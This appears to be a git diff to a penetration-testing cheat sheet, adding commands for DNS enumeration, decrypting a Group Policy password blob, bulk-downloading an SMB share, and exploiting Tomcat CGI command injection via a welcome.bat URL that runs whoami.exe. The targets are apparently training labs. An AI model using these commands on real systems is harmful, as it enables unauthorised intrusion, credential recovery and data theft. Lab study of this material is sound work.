@@ -92,6 +92,7 @@
 - [Splunk](#splunk)
 - [PRTG Network Monitor](#prtg_network_monitor)
 - [Wordpress](#wordpress)
+- [Tomcat CGI](#tomcat_cgi)
 - [Active Directory](#active-directory)
 - [Windows Privilege Escalation](#windows-privilege-escalation)
   - [Manual Enumeration](#manual-enumeration)
@@ -746,6 +747,12 @@ netexec smb 10.x.x.x -u 'operator' -p 'operator' --shares
 
 ### Nslookup
 ```bash
+# Interactive mode
+> nslookup
+> server 10.10.10.100
+> 127.0.0.1
+> 10.10.10.100
+
 #A Records
 nslookup $TARGET
 nslookup -query=A $TARGET
@@ -1220,6 +1227,7 @@ sudo tcpdump -SX -i breachad tcp port 389
 
 
 ### gpp-decrypt(Groups.xml)
+Group policy password
 ```bash
 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                                            
 ```
@@ -1463,6 +1471,7 @@ CommandLine = $Command
 
 ### dnsrecon
 ```bash
+dnsrecon -d megacorpone.com -r 10.0.0.0/8
 dnsrecon -d megacorpone.com -t std
 dnsrecon -d megacorp.com -D ~/list.txt -t brt
 ```
@@ -1553,6 +1562,14 @@ smbclient -N -L \\\\10.129.42.253
 smbclient \\\\10.129.42.253\\users
 smbclient -U bob \\\\10.129.42.253\\users
 smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
+
+# download everything
+mask ""
+recurse ON
+prompt OFF
+cd 'path\to\remote\dir'
+lcd '~/path/to/download/to/'
+mget *
 ```
 
 
@@ -2343,6 +2360,19 @@ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campai
 # Vulnerable Plugins - wpDiscuz
 python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
 ```
+
+# Tomcat CGI
+```bash
+# default directory for CGI scripts is /cgi
+# http://10.129.204.227:8080/cgi/FUZZ.cmd or http://10.129.204.227:8080/cgi/FUZZ.bat to perform fuzzing.
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+
+# execute whoami.exe
+http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+
+```
+
 
 # Gitlab
 ```bash
